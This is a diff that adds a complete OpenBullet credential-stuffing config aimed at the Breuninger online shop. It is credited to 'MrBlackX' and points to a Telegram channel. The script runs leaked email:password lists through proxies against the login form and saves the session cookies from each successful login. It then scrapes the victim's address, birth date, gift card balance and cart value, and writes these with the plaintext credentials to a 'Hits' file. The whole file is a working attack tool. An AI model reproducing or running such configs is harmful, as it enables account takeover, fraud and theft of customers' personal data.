@@ -1,0 +1,165 @@
+[SETTINGS]
+{
+  "Name": "Breunninger",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-24T09:15:20.5346569-08:00",
+  "AdditionalInfo": "https://t.me/viperzcrew",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#req REQUEST GET "https://www.breuninger.com/de/kauf/login/konto" 
+  
+  HEADER "Host: www.breuninger.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "TE: Trailers" 
+
+#csrf PARSE "<SOURCE>" LR " name=\"_csrf\" value=\"" "\"" -> VAR "csrf" 
+
+#length FUNCTION Constant "_csrf=<csrf>&email=<USER>&passwort=<PASS>&plain=<PASS>&successRedirect=%2Fkonto%2Fmein-konto&failRedirect=" -> VAR "length" 
+
+#login REQUEST POST "https://www.breuninger.com/de/kauf/login/konto" 
+  CONTENT "_csrf=<csrf>&email=<USER>&passwort=<PASS>&plain=<PASS>&successRedirect=%2Fkonto%2Fmein-konto&failRedirect=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.breuninger.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: <length>" 
+  HEADER "Origin: https://www.breuninger.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.breuninger.com/de/kauf/login/konto?referrer=%2Fkonto%2Fmein-konto" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "TE: Trailers" 
+
+#check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Leider konnten wir Sie nicht anmelden" 
+    KEY "Leider stimmt die eingegebene Postleitzahl, die E-Mail-Adresse oder das eingegebene Passwort nicht mit dem an Ihrem Konto überein" 
+    KEY "Ihr Kundenkonto ist leider gesperrt" 
+  KEYCHAIN Success OR 
+    KEY "<title>Mein Konto</title>" 
+
+!IF "<SOURCE>" Contains "<title>Mein Konto</title>"
+
+!#save_cookies UTILITY File "Cookies\\Breuninger-<USER>-cookies.txt" WriteLines "www.breuninger.com	true	/	true	<Time>	cid	<COOKIES(wid)>\\nwww.breuninger.com	true	/	true	0	vid	<COOKIES(wid)>\\nwww.breuninger.com	true	/de	true	<Time>	wid	<COOKIES(wid)>\\nwww.breuninger.com	true	/	false	<Time>	breuningerAnmeldungTracking	<COOKIES(breuningerAnmeldungTracking)>\\nwww.breuninger.com	true	/de	true	<Time>	breuningerSoftLogin	<COOKIES(breuningerSoftLogin)>\\nwww.breuninger.com	true	/de	false	<Time>	kaufen_logged_in	true\\nwww.breuninger.com	true	/de	true	<Time>	breuningerLogin	<COOKIES(breuningerLogin)>" 
+
+!ENDIF
+
+#Unix FUNCTION CurrentUnixTime -> VAR "Time" 
+
+#save_cookies UTILITY File "Cookies\\Breuninger-<USER>-cookies.txt" WriteLines "www.breuninger.com	true	/	true	<Time>	cid	<COOKIES(wid)>\\nwww.breuninger.com	true	/	true	0	vid	<COOKIES(wid)>\\nwww.breuninger.com	true	/de	true	<Time>	wid	<COOKIES(wid)>\\nwww.breuninger.com	true	/	false	<Time>	breuningerAnmeldungTracking	<COOKIES(breuningerAnmeldungTracking)>\\nwww.breuninger.com	true	/de	true	<Time>	breuningerSoftLogin	<COOKIES(breuningerSoftLogin)>\\nwww.breuninger.com	true	/de	false	<Time>	kaufen_logged_in	true\\nwww.breuninger.com	true	/de	true	<Time>	breuningerLogin	<COOKIES(breuningerLogin)>" 
+
+IF "<SOURCE>" Contains "Sie haben noch keine Bestellungen aufgegeben"
+SET CAP "Bestellungen" "Nein"
+ELSE
+SET CAP "Bestellungen" "Ja"
+ENDIF
+
+#address REQUEST GET "https://www.breuninger.com/de/konto/adressbuch" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#addr PARSE "<SOURCE>" LR "=\"_\"><p class=\"kaufen-copytext\">" "<br /></p><span class=\"kaufen-adresse-darstellen__icon\">" -> VAR "addr" 
+
+#repl FUNCTION Replace "<br />" ", " "<addr>" -> CAP "Address" 
+
+#dob REQUEST GET "https://www.breuninger.com/de/kauf/rechnungsadresse/editieren/layer/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#dob PARSE "<SOURCE>" LR "><input class=\"kaufen-input\" id=\"kaufen-adresse-geburtsdatum\" name=\"geburtsdatum\" type=\"text\" value=\"" "\" required proportion=\"narrow\">" -> VAR "DoB" 
+
+IF "<DoB>" EqualTo ""
+SET CAP "Birthday" "N/A"
+ELSE
+SET CAP "Birthday" "<DoB>"
+ENDIF
+
+#Items REQUEST GET "https://www.breuninger.com/de/kauf/warenkorb/miniwarenkorb" 
+  
+  HEADER "Host: www.breuninger.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: de,en-US;q=0.7,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.breuninger.com/de/konto/bestellung/meine-bestellungen" 
+  HEADER "TE: Trailers" 
+
+#giftcards PARSE "<SOURCE>" JSON "geschenkkarten" -> VAR "GC" 
+
+IF "<GC>" EqualTo ""
+SET CAP "Giftcard" "Nein"
+ELSE
+SET CAP "Giftcard" "<GC>"
+ENDIF
+
+#cart_money PARSE "<SOURCE>" JSON "geldwert" -> VAR "Sum" 
+
+#repl2 FUNCTION Replace " â‚¬" "€" "<Sum>" -> CAP "Summe" 
+
+REQUEST GET "https://www.breuninger.com/de/konto/bestellung/meine-bestellungen" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#config_by FUNCTION Constant "- MrBlackX -" -> CAP "Config By" 
+
+#save_to_file UTILITY File "Breuninger Hits.txt" AppendLines "~ ~ ~ ~ < 💚 B R E U N N I N G E R 💚 > ~ ~ ~ ~\\n\\nCombo: <USER>:<PASS>\\nBestellungen : <Bestellungen>\\nAdresse : <Address>\\nGeburtstag : <Birthday>\\nGeschenkkarten : <Giftcard>\\nBalance : <Summe>\\nCookies : <NAME>\\nLogin: https://www.breuninger.com/de/kauf/login/konto- Config By MrBlackX -\\n\\n~ ~ ~ ~ < 💚 C O N F I G 💚 > ~ ~ ~ ~\\n" 
+
